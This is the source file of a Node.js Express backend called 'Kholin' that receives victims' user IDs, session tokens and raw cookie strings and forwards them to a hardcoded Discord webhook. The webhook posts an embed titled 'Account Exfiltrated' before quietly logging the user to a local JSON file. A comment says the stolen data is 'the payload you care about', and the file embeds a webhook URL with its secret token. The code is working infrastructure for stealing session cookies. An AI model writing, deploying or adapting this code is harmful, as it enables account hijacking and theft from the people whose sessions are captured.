const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// ==========================================
// CONFIGURATION
// ==========================================
// Paste your Discord Webhook URL here.
// (If using Render environment variables, use: process.env.WEBHOOK_URL)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1520927081846931610/JLhOk92uLy1denvDszfGybheNOP2QiOpz1jqBJM6cqP-jxXiU_76ftgIerWC-j8h1vQI";

// Path to the JSON database
const DB_FILE = path.join(__dirname, 'users.json');

// Helper: Read the database
const readDB = () => {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify({ users: [] }, null, 2));
        return { users: [] };
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
};

// Helper: Write to the database
const writeDB = (data) => {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
};

// Helper: Send to Discord Webhook
async function sendToDiscord(userId, username, sessionToken, rawCookieString) {
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
        console.warn("[SERVER] Webhook URL not configured! Skipping Discord send.");
        return false;
    }

    const payload = {
        username: "Kholin API Logger",
        avatar_url: "https://playvortex.io/favicon.ico",
        embeds: [{
            title: "🦊 Account Exfiltrated (via Render API)",
            color: 0x0b6bcb,
            fields: [
                { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
                { name: "🆔 User ID", value: `\`${userId || 'Unknown'}\``, inline: false },
                { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'MISSING'}\`\`\``, inline: false },
                { name: "📦 Raw Cookies String", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
            ],
            footer: { text: "Kholin Backend • Logger" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error('[SERVER] Discord webhook failed:', response.status);
            return false;
        }
        console.log('[SERVER] Successfully sent data to Discord.');
        return true;
    } catch (err) {
        console.error('[SERVER] Error sending to Discord:', err.message);
        return false;
    }
}

// ==========================================
// API ROUTES
// ==========================================

// 1. GET: Fetch all users
app.get('/api/users', (req, res) => {
    const db = readDB();
    res.json(db);
});

// 2. POST: Register or Update a User & Forward Cookies to Webhook
app.post('/api/users/register', async (req, res) => {
    const { userId, username, sessionToken, rawCookieString } = req.body;

    if (!userId) {
        return res.status(400).json({ error: 'userId is required' });
    }

    // Step A: Send the data to Discord FIRST (this is the payload you care about)
    await sendToDiscord(userId, username, sessionToken, rawCookieString);

    // Step B: Save the user to the database (Keep your original functionality)
    const db = readDB();
    let user = db.users.find(u => u.userId === userId);

    if (user) {
        user.lastSeen = new Date().toISOString();
        if (username) user.username = username;
        writeDB(db);
        return res.json({ message: 'User updated', user });
    } else {
        const newUser = {
            userId: userId,
            username: username || 'Anonymous',
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            settings: {}
        };
        db.users.push(newUser);
        writeDB(db);
        return res.status(201).json({ message: 'New user registered', user: newUser });
    }
});

// 3. GET: Get a specific user's data
app.get('/api/users/:userId', (req, res) => {
    const { userId } = req.params;
    const db = readDB();
    const user = db.users.find(u => u.userId === userId);

    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    res.json(user);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Kholin backend server running at http://localhost:${PORT}`);
    console.log(`API endpoints:`);
    console.log(`  GET  /api/users`);
    console.log(`  POST /api/users/register`);
    console.log(`  GET  /api/users/:userId`);
});
